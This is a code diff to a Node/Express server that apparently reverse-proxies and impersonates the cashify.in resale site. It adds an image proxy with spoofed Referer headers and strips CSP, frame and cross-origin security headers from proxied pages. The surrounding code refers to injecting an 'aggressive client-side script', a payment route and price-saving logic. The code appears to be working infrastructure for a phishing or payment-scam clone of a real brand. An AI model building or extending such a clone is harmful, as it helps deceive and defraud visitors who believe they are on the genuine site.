@@ -583,6 +583,25 @@ app.use("/payment", (req, res) => {
     `);
 });
 
+// ─── Image Proxy → s3ng.cashify.in CDN ──────────────────────────────────────
+// Product images come from s3ng.cashify.in — proxy them to avoid CORS/block
+app.use("/img-proxy", createProxyMiddleware({
+  target: "https://s3ng.cashify.in",
+  changeOrigin: true,
+  secure: true,
+  pathRewrite: { "^/img-proxy": "" },
+  on: {
+    proxyReq: (proxyReq) => {
+      proxyReq.setHeader("Referer", "https://www.cashify.in/");
+      proxyReq.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+    },
+    proxyRes: (proxyRes, req, res) => {
+      res.setHeader("access-control-allow-origin", "*");
+      res.setHeader("cache-control", "public, max-age=86400");
+    }
+  }
+}));
+
 // ─── Reverse Proxy → cashify.in ──────────────────────────────────────────────
 // Baaki sab routes real cashify.in pe forward karo
 app.use(
@@ -607,9 +626,18 @@ app.use(
       proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
         const contentType = proxyRes.headers["content-type"] || "";
         
-        // Remove CSP headers so our page loads fine
+        // Remove ALL restrictive headers so images and scripts load fine
         res.removeHeader("content-security-policy");
+        res.removeHeader("content-security-policy-report-only");
         res.removeHeader("x-frame-options");
+        res.removeHeader("x-content-type-options");
+        res.removeHeader("cross-origin-embedder-policy");
+        res.removeHeader("cross-origin-opener-policy");
+        res.removeHeader("cross-origin-resource-policy");
+        // Allow images from s3ng.cashify.in and other CDNs
+        res.setHeader("access-control-allow-origin", "*");
+        res.setHeader("access-control-allow-methods", "GET, POST, OPTIONS");
+        res.setHeader("timing-allow-origin", "*");
 
         if (contentType.includes("text/html") || contentType.includes("application/json")) {
           let text = responseBuffer.toString('utf8');
@@ -676,6 +704,8 @@ app.use(
              // Also fix lazy-load data-src attributes
              text = text.replace(/(\bdata-src=)(["'])(?!https?:\/\/|data:|\/\/)(\/[^"'>\s]+)/gi,
                (m, attr, q, path) => `${attr}${q}https://www.cashify.in${path}`);
+             // Rewrite s3ng.cashify.in image URLs through our /img-proxy to avoid CORS
+             text = text.replace(/https:\/\/s3ng\.cashify\.in/g, '/img-proxy');
 
              // 4. Inject aggressive client-side script
              const injectedScript = `
@@ -986,36 +1016,44 @@ app.use(
                    // ── Force load all lazy images ──
                    function forceLoadImages() {
                      document.querySelectorAll('img').forEach(img => {
-                       // Fix relative src
-                       if (img.src && img.src.startsWith(window.location.origin) && !img.src.includes('cashify.in')) {
-                         const path = img.getAttribute('src');
-                         if (path && path.startsWith('/') && !path.startsWith('//')) {
-                           img.src = 'https://www.cashify.in' + path;
+                       // Rewrite s3ng.cashify.in URLs through our proxy to avoid CORS block
+                       function rewriteSrc(src) {
+                         if (!src) return src;
+                         if (src.includes('s3ng.cashify.in')) {
+                           return src.replace('https://s3ng.cashify.in', '/img-proxy');
                          }
+                         if (src.startsWith('/') && !src.startsWith('//') && !src.startsWith('/img-proxy')) {
+                           return 'https://www.cashify.in' + src;
+                         }
+                         return src;
                        }
-                       // Lazy load: copy data-src / data-lazy / data-original to src
+                       // Fix lazy load attributes first
                        const lazySrc = img.getAttribute('data-src') ||
                                        img.getAttribute('data-lazy') ||
                                        img.getAttribute('data-original') ||
                                        img.getAttribute('data-lazy-src') ||
                                        img.getAttribute('data-img');
-                       if (lazySrc && (!img.src || img.src === window.location.href || img.naturalWidth === 0)) {
-                         const abs = lazySrc.startsWith('/') ? 'https://www.cashify.in' + lazySrc : lazySrc;
-                         img.src = abs;
+                       if (lazySrc) {
+                         img.src = rewriteSrc(lazySrc);
                          img.removeAttribute('data-src');
                          img.removeAttribute('data-lazy');
+                       } else if (img.src) {
+                         const rewritten = rewriteSrc(img.getAttribute('src') || '');
+                         if (rewritten && rewritten !== img.getAttribute('src')) img.src = rewritten;
                        }
-                       // Fix srcset too
-                       const lazySrcset = img.getAttribute('data-srcset');
-                       if (lazySrcset) {
-                         img.srcset = lazySrcset;
-                         img.removeAttribute('data-srcset');
+                       // Fix srcset
+                       const lazySrcset = img.getAttribute('data-srcset') || img.getAttribute('srcset') || '';
+                       if (lazySrcset && lazySrcset.includes('s3ng.cashify.in')) {
+                         const fixed = lazySrcset.replace(/https:\/\/s3ng\.cashify\.in/g, '/img-proxy');
+                         img.srcset = fixed;
                        }
                      });
                      // Also handle picture > source elements
                      document.querySelectorAll('source').forEach(src => {
-                       const lazy = src.getAttribute('data-srcset') || src.getAttribute('data-src');
-                       if (lazy) { src.srcset = lazy; }
+                       const lazy = src.getAttribute('data-srcset') || src.getAttribute('srcset') || '';
+                       if (lazy && lazy.includes('s3ng.cashify.in')) {
+                         src.srcset = lazy.replace(/https:\/\/s3ng\.cashify\.in/g, '/img-proxy');
+                       }
                      });
                    }
                    function savePagePrice() {
